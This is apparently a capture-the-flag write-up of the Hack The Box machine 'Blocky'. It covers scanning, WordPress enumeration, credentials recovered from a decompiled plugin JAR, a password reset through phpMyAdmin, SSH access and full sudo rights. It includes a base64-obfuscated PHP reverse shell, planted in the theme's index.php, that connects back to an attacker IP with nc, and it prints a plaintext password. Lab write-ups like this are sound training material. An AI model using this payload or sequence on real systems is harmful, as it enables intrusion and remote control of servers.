# Blocky (User/Root Compromise)
- Target IP: 10.129.24.211

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 21,22,80,25565
```

```bash
nmap -iL scope.txt -p21 -sCV -oA Nmap/sCV-21 --open -Pn

# Output
```

```bash
nmap -iL scope.txt -p22 -sCV -oA Nmap/sCV-22 --open -Pn

# Output
# OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# Output
# Apache httpd 2.4.18
# http://blocky.htb -> added to /etc/hosts
```

```bash
nmap -iL scope.txt -p25565 -sCV -oA Nmap/sCV-25565 --open -Pn

# Output
# Minecraft 1.11.2
```

```bash
nxc ftp 10.129.24.211
FTP         10.129.24.211   21     10.129.24.211    [*] Banner: ProFTPD 1.3.5a Server (Debian) [::ffff:10.129.24.211]
```

```bash
nxc ftp 10.129.24.211 -u 'Anonymous' -p 'email@email.com'
FTP         10.129.24.211   21     10.129.24.211    [*] Banner: ProFTPD 1.3.5a Server (Debian) [::ffff:10.129.24.211]
FTP         10.129.24.211   21     10.129.24.211    [-] Anonymous:email@email.com (Response:530 Login incorrect.)
```

```bash
nxc ftp 10.129.24.211 -u 'Anonymous' -p ''
FTP         10.129.24.211   21     10.129.24.211    [*] Banner: ProFTPD 1.3.5a Server (Debian) [::ffff:10.129.24.211]
FTP         10.129.24.211   21     10.129.24.211    [-] Anonymous: (Response:530 Login incorrect.)
```

```bash
nxc ftp 10.129.24.211 -u '' -p ''
FTP         10.129.24.211   21     10.129.24.211    [*] Banner: ProFTPD 1.3.5a Server (Debian) [::ffff:10.129.24.211]
FTP         10.129.24.211   21     10.129.24.211    [-] : (Response:530 Login incorrect.)
```

# FTP
- ProFTPD 1.3.5a
- https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/exploit.py

# Wordpress
```bash
wpscan -e u1-100 --url http://blocky.htb

# Output
# notch/Notch
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt --url http://blocky.htb/

# Output
# /wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
# /plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
# /wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
# /wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
# /javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
# /wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
# /phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
```

- `/plugins` -> Two JAR files
- Using https://java-decompiler.github.io/ to decompile the JARs

```java
// BlockyCore.jar
public String sqlHost = "localhost";
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

- Access /phpmyadmin with these credentials
- Update notch's password with `$P$BHejAEdCcKblwT8b2lrdqiznRIpf8x1` : `admin`
- Edit the current theme's index.php with the following PHP reverse shell
```php
<?php shell_exec(base64_decode("cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuMTczIDQ0MyA+L3RtcC9mCg==")); ?>
```

- The credentials also work for SSH
```bash
nxc ssh 10.129.24.211 -u 'notch' -p '8YsqfCTnvxAUeduzjNSXe22'
SSH         10.129.24.211   22     10.129.24.211    [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
SSH         10.129.24.211   22     10.129.24.211    [*] Current user: 'notch' was in 'sudo' group, please try '--sudo-check' to check if user can run sudo shell
SSH         10.129.24.211   22     10.129.24.211    [+] notch:8YsqfCTnvxAUeduzjNSXe22  Linux - Shell access!
```

# Priv-Esc
```bash
sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
